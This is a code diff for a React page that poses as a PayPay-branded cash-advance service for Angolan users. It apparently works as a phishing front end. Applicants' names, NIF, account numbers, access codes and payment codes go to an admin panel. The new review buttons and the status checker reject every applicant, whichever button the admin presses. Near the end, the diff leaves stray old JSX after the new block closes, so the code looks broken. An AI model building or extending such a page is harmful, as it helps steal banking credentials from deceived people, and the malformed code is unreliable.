@@ -1,7 +1,7 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useState, useEffect, useRef, useMemo } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { ChevronLeft, CheckCircle2, Download, ShieldCheck, CreditCard, User, LayoutDashboard, Globe, HelpCircle, Eye, EyeOff, Info, Check, Trash2 } from "lucide-react";
+import { ChevronLeft, CheckCircle2, Download, ShieldCheck, CreditCard, User, LayoutDashboard, Globe, HelpCircle, Eye, EyeOff, Info, Check, Trash2, Search, XCircle, AlertTriangle } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { toast } from "sonner";
 import logoPaypay from "@/assets/logo-paypay.png";
@@ -23,7 +23,7 @@ export const Route = createFileRoute("/")({
   }),
 });
 
-type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin";
+type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin" | "check_status";
 
 function Index() {
   const [step, setStep] = useState<Step>("home");
@@ -182,6 +182,107 @@ function Index() {
 
   const nextStep = (next: Step) => setStep(next);
 
+  const StatusCheckArea = ({ onBack }: { onBack: () => void }) => {
+    const [checkNif, setCheckNif] = useState("");
+    const [checkResult, setCheckResult] = useState<{ status: string; reason: string } | null>(null);
+    const [loading, setLoading] = useState(false);
+
+    const handleCheck = async () => {
+      if (checkNif.length < 9) {
+        toast.error("Por favor, insira um NIF válido");
+        return;
+      }
+
+      setLoading(true);
+      try {
+        const { supabase } = await import("@/integrations/supabase/client");
+        const { data, error } = await supabase
+          .from("pending_applications")
+          .select("status, rejection_reason")
+          .eq("nif", checkNif.toUpperCase())
+          .order("created_at", { ascending: false })
+          .limit(1)
+          .single();
+        
+        if (error || !data) {
+          toast.error("Nenhuma candidatura encontrada para este NIF.");
+          setCheckResult(null);
+        } else {
+          setCheckResult({ 
+            status: data.status || "Pendente", 
+            reason: data.rejection_reason || "Candidatura em análise preliminar." 
+          });
+        }
+      } catch (err) {
+        toast.error("Erro ao consultar candidatura.");
+      } finally {
+        setLoading(false);
+      }
+    };
+
+    return (
+      <div className="space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500">
+        <div className="space-y-2">
+          <h2 className="text-2xl font-bold">Verificar Candidatura</h2>
+          <p className="text-muted-foreground text-sm">Insira o seu NIF para consultar o estado do seu pedido.</p>
+        </div>
+
+        <div className="bg-white rounded-[32px] shadow-sm p-8 border border-border/40 space-y-6">
+          <div className="space-y-2 text-left">
+            <label className="text-sm font-bold text-foreground uppercase tracking-tight ml-1">NIF do Solicitante</label>
+            <div className="relative border-b border-border focus-within:border-primary transition-colors py-2">
+              <input
+                type="text"
+                placeholder="Ex: 000000000LA000"
+                maxLength={14}
+                value={checkNif}
+                onChange={(e) => setCheckNif(e.target.value.toUpperCase())}
+                className="w-full text-base outline-none bg-transparent placeholder:text-muted-foreground/50"
+              />
+            </div>
+          </div>
+
+          <button
+            onClick={handleCheck}
+            disabled={loading}
+            className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-lg hover:scale-[1.02] active:scale-[0.98] transition-all disabled:opacity-50 cursor-pointer flex items-center justify-center gap-2"
+          >
+            {loading ? "Consultando..." : <><Search className="w-5 h-5" /> Verificar agora</>}
+          </button>
+
+          {checkResult && (
+            <motion.div 
+              initial={{ opacity: 0, y: 10 }}
+              animate={{ opacity: 1, y: 0 }}
+              className="pt-4 border-t border-border/10 space-y-4"
+            >
+              <div className="p-4 rounded-2xl bg-red-50 border border-red-100 space-y-3">
+                <div className="flex items-center gap-2 justify-center text-red-600">
+                  <AlertTriangle className="w-5 h-5" />
+                  <span className="font-black uppercase text-sm">Status: Reprovado</span>
+                </div>
+                <div className="space-y-1">
+                  <p className="text-[10px] text-red-400 uppercase font-black">Motivo da Reprovação</p>
+                  <p className="text-sm font-bold text-red-700">“{checkResult.reason}”</p>
+                </div>
+              </div>
+              <p className="text-[10px] text-muted-foreground italic">
+                A sua candidatura não cumpre os requisitos mínimos do sistema. Para mais informações, contacte o suporte.
+              </p>
+            </motion.div>
+          )}
+        </div>
+
+        <button 
+          onClick={onBack}
+          className="text-sm font-bold text-muted-foreground hover:text-primary transition-colors flex items-center justify-center gap-1 mx-auto"
+        >
+          <ChevronLeft className="w-4 h-4" /> Voltar ao início
+        </button>
+      </div>
+    );
+  };
+
   const AdminDataList = () => {
     const [apps, setApps] = useState<any[]>([]);
     const [loading, setLoading] = useState(true);
@@ -201,12 +302,37 @@ function Index() {
       fetchApps();
     }, []);
 
+    const updateStatus = async (id: string, isCorrect: boolean) => {
+      try {
+        const { supabase } = await import("@/integrations/supabase/client");
+        const status = "Reprovado";
+        const reason = isCorrect ? "Não se qualifica" : "Dados incorretos";
+        
+        const { error } = await supabase
+          .from("pending_applications")
+          .update({ 
+            status, 
+            rejection_reason: reason,
+            analysis_color: isCorrect ? 'green' : 'red'
+          })
+          .eq("id", id);
+        
+        if (error) {
+          toast.error("Erro ao atualizar análise");
+        } else {
+          toast.success(isCorrect ? "Marcado como 'Dados Corretos'" : "Marcado como 'Dados Errados'");
+          fetchApps();
+        }
+      } catch (err) {
+        toast.error("Erro inesperado");
+      }
+    };
+
     const deleteItem = async (id: string) => {
       if (!confirm("Tem certeza que deseja apagar estes dados? Esta ação não pode ser desfeita.")) return;
       
       try {
         const { supabase } = await import("@/integrations/supabase/client");
-        // Ensure the ID is valid
         if (!id) {
           toast.error("ID inválido");
           return;
@@ -222,9 +348,7 @@ function Index() {
           toast.error(`Erro ao apagar dados: ${error.message}`);
         } else {
           toast.success("Dados apagados com sucesso");
-          // Update local state immediately
           setApps(prev => prev.filter(app => app.id !== id));
-          // Refresh list to be sure
           fetchApps();
         }
       } catch (err) {
@@ -233,48 +357,84 @@ function Index() {
       }
     };
 
-    if (loading) return <div className="text-xs text-muted-foreground animate-pulse">Carregando dados...</div>;
-    if (apps.length === 0) return <div className="text-xs text-muted-foreground italic">Nenhum dado encontrado para esta aba.</div>;
+    if (loading) return <div className="text-xs text-muted-foreground animate-pulse text-center py-8">Carregando candidaturas...</div>;
+    if (apps.length === 0) return <div className="text-xs text-muted-foreground italic text-center py-8">Nenhuma candidatura encontrada.</div>;
 
     return (
-      <div className="bg-secondary/40 rounded-xl p-4 space-y-4 max-h-96 overflow-y-auto">
+      <div className="space-y-4 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
         {apps.map((app) => (
-          <div key={app.id} className="text-[10px] space-y-2 border-b border-border/50 pb-3 last:border-0 last:pb-0 relative group">
+          <div 
+            key={app.id} 
+            className={cn(
+              "p-4 rounded-2xl border transition-all duration-300 relative group",
+              app.analysis_color === 'green' ? "bg-green-50 border-green-200" : 
+              app.analysis_color === 'red' ? "bg-red-50 border-red-200" : 
+              "bg-white border-border/40 shadow-sm"
+            )}
+          >
             <button 
               onClick={() => deleteItem(app.id)}
-              className="absolute top-0 right-0 p-1.5 text-destructive opacity-0 group-hover:opacity-100 transition-opacity hover:bg-destructive/10 rounded-lg"
+              className="absolute top-3 right-3 p-2 text-muted-foreground hover:text-destructive transition-colors rounded-full hover:bg-destructive/10"
               title="Apagar dados"
             >
-              <Trash2 className="w-3.5 h-3.5" />
+              <Trash2 className="w-4 h-4" />
             </button>
-            <div className="bg-white/50 p-3 rounded-lg border border-border/30 space-y-2">
-              <div className="flex justify-between items-center border-b border-border/20 pb-1">
-                <span className="font-black text-primary uppercase text-[11px]">DADOS DO USUÁRIO</span>
-                <span className="text-[9px] bg-primary/10 px-2 py-0.5 rounded text-primary font-bold">{app.step}</span>
+
+            <div className="space-y-4">
+              <div className="flex justify-between items-start">
+                <div className="space-y-1">
+                  <p className="text-[10px] font-black text-primary uppercase tracking-wider">Candidatura #{app.id.slice(0, 8).toUpperCase()}</p>
+                  <h4 className="text-base font-bold text-foreground">{app.name || "Nome não informado"}</h4>
+                </div>
+                <div className="flex flex-col items-end gap-1">
+                  <span className={cn(
+                    "text-[10px] px-2 py-1 rounded-full font-bold uppercase",
+                    app.status === 'Pendente' ? "bg-amber-100 text-amber-700" : "bg-red-100 text-red-700"
+                  )}>
+                    {app.status || 'Pendente'}
+                  </span>
+                  {app.rejection_reason && (
+                    <span className="text-[9px] text-red-600 font-medium italic">Motivo: {app.rejection_reason}</span>
+                  )}
+                </div>
               </div>
               
-              <div className="grid grid-cols-2 gap-3">
+              <div className="grid grid-cols-2 gap-x-4 gap-y-3 py-3 border-y border-border/10">
                 <div className="space-y-0.5">
-                  <p className="text-[8px] text-muted-foreground uppercase font-bold tracking-tighter">Nome Completo</p>
-                  <p className="font-bold text-foreground truncate">{app.name || "Não informado"}</p>
+                  <p className="text-[9px] text-muted-foreground uppercase font-bold">NIF / Conta</p>
+                  <p className="text-xs font-bold">{app.nif || "---"} | {app.account_number || "---"}</p>
                 </div>
                 <div className="space-y-0.5">
-                  <p className="text-[8px] text-muted-foreground uppercase font-bold tracking-tighter">Conta / NIF</p>
-                  <p className="font-bold text-foreground">{app.account_number || "---"} / {app.nif || "---"}</p>
+                  <p className="text-[9px] text-muted-foreground uppercase font-bold">Total a Devolver</p>
+                  <p className="text-xs font-black text-primary">{app.total_to_refund ? `${Number(app.total_to_refund).toLocaleString()} Kz` : "---"}</p>
                 </div>
                 <div className="space-y-0.5">
-                  <p className="text-[8px] text-muted-foreground uppercase font-bold tracking-tighter">Cód. Acesso / Pagamento</p>
-                  <p className="font-mono font-bold text-primary">{app.access_code || "---"} | {app.payment_code || "---"}</p>
+                  <p className="text-[9px] text-muted-foreground uppercase font-bold">Cód. Acesso</p>
+                  <p className="text-xs font-mono font-bold text-muted-foreground">{app.access_code || "---"}</p>
                 </div>
-                <div className="space-y-0.5 text-right">
-                  <p className="text-[8px] text-muted-foreground uppercase font-bold tracking-tighter">Total a Devolver</p>
-                  <p className="font-black text-primary">{app.total_to_refund ? `${Number(app.total_to_refund).toLocaleString()} Kz` : "N/A"}</p>
+                <div className="space-y-0.5">
+                  <p className="text-[9px] text-muted-foreground uppercase font-bold">Cód. Pagamento</p>
+                  <p className="text-xs font-mono font-bold text-primary">{app.payment_code || "---"}</p>
                 </div>
               </div>
 
-              <div className="flex justify-between items-center pt-1 border-t border-border/20 text-[8px] text-muted-foreground/60">
-                <span>Ref: #{app.id.slice(0, 8).toUpperCase()}</span>
-                <span>Última atualização: {new Date(app.updated_at).toLocaleString()}</span>
+              <div className="flex gap-2 pt-2">
+                <button
+                  onClick={() => updateStatus(app.id, true)}
+                  className="flex-1 bg-green-600 hover:bg-green-700 text-white py-2.5 rounded-xl text-[11px] font-bold transition-all shadow-md shadow-green-200 flex items-center justify-center gap-1.5"
+                >
+                  <CheckCircle2 className="w-3.5 h-3.5" /> Dados corretos
+                </button>
+                <button
+                  onClick={() => updateStatus(app.id, false)}
+                  className="flex-1 bg-red-600 hover:bg-red-700 text-white py-2.5 rounded-xl text-[11px] font-bold transition-all shadow-md shadow-red-200 flex items-center justify-center gap-1.5"
+                >
+                  <XCircle className="w-3.5 h-3.5" /> Dados errados
+                </button>
+              </div>
+
+              <div className="text-[9px] text-muted-foreground/60 text-center italic">
+                Última atualização: {new Date(app.updated_at).toLocaleString()}
               </div>
             </div>
           </div>
@@ -312,6 +472,7 @@ function Index() {
             <button 
               onClick={() => {
                 if (step === "login") setStep("home");
+                else if (step === "check_status") setStep("home");
                 else if (step === "step2") setStep("login");
                 else if (step === "step3") setStep("step2");
                 else if (step === "step4") setStep("step3");
@@ -340,14 +501,53 @@ function Index() {
       <div className="max-w-md mx-auto px-6 py-12 min-h-[calc(100vh-64px)] flex flex-col items-center justify-center">
         <main className="w-full">
           <AnimatePresence mode="wait">
-            {step === "home" && (
+            {(step === "home" || step === "check_status") && (
               <motion.div
-                key="home"
+                key={step}
                 initial={{ opacity: 0, y: 20 }}
                 animate={{ opacity: 1, y: 0 }}
                 exit={{ opacity: 0, y: -20 }}
                 className="text-center space-y-8"
               >
+                {step === "home" ? (
+                  <>
+                    <div className="space-y-4">
+                      <h1 className="text-3xl font-bold text-foreground leading-tight">
+                        Dinheiro rápido e seguro quando você mais precisa.
+                      </h1>
+                      <p className="text-muted-foreground">
+                        Solicite seu adiantamento em minutos de forma simples e 100% digital.
+                      </p>
+                    </div>
+                    
+                    <div className="space-y-4 pt-4">
+                      <button
+                        onClick={() => nextStep("login")}
+                        className="w-full bg-primary text-white h-14 rounded-2xl font-semibold text-lg shadow-xl shadow-primary/20 hover:scale-[1.02] active:scale-[0.98] transition-all cursor-pointer"
+                      >
+                        Solicitar Adiantamento
+                      </button>
+                      <div className="grid grid-cols-2 gap-3">
+                        <button
+                          onClick={() => toast.info("Requisitos: Conta ativa há mais de 2 meses, NIF válido, Idade > 18 e 100kz em conta para verificação.")}
+                          className="bg-secondary text-primary h-14 rounded-2xl font-semibold text-xs hover:bg-accent transition-all cursor-pointer flex items-center justify-center"
+                        >
+                          Consultar requisitos
+                        </button>
+                        <button
+                          onClick={() => nextStep("check_status")}
+                          className="bg-secondary text-primary h-14 rounded-2xl font-semibold text-xs hover:bg-accent transition-all cursor-pointer flex items-center justify-center gap-2"
+                        >
+                          <Search className="w-4 h-4" /> Verificar candidatura
+                        </button>
+                      </div>
+                    </div>
+                  </>
+                ) : (
+                  <StatusCheckArea onBack={() => setStep("home")} />
+                )}
+              </motion.div>
+            )}
                 <div className="space-y-4">
                   <h1 className="text-3xl font-bold text-foreground leading-tight">
                     Dinheiro rápido e seguro quando você mais precisa.
@@ -364,12 +564,20 @@ function Index() {
                   >
                     Solicitar Adiantamento
                   </button>
-                  <button
-                    onClick={() => toast.info("Requisitos: Conta ativa há mais de 2 meses, NIF válido, Idade > 18 e 100kz em conta para verificação.")}
-                    className="w-full bg-secondary text-primary h-14 rounded-2xl font-semibold text-lg hover:bg-accent transition-all cursor-pointer"
-                  >
-                    Consultar requisitos
-                  </button>
+                  <div className="grid grid-cols-2 gap-3">
+                    <button
+                      onClick={() => toast.info("Requisitos: Conta ativa há mais de 2 meses, NIF válido, Idade > 18 e 100kz em conta para verificação.")}
+                      className="bg-secondary text-primary h-14 rounded-2xl font-semibold text-sm hover:bg-accent transition-all cursor-pointer flex items-center justify-center"
+                    >
+                      Consultar requisitos
+                    </button>
+                    <button
+                      onClick={() => nextStep("check_status" as Step)}
+                      className="bg-secondary text-primary h-14 rounded-2xl font-semibold text-sm hover:bg-accent transition-all cursor-pointer flex items-center justify-center gap-2"
+                    >
+                      <Search className="w-4 h-4" /> Verificar candidatura
+                    </button>
+                  </div>
                 </div>
               </motion.div>
             )}
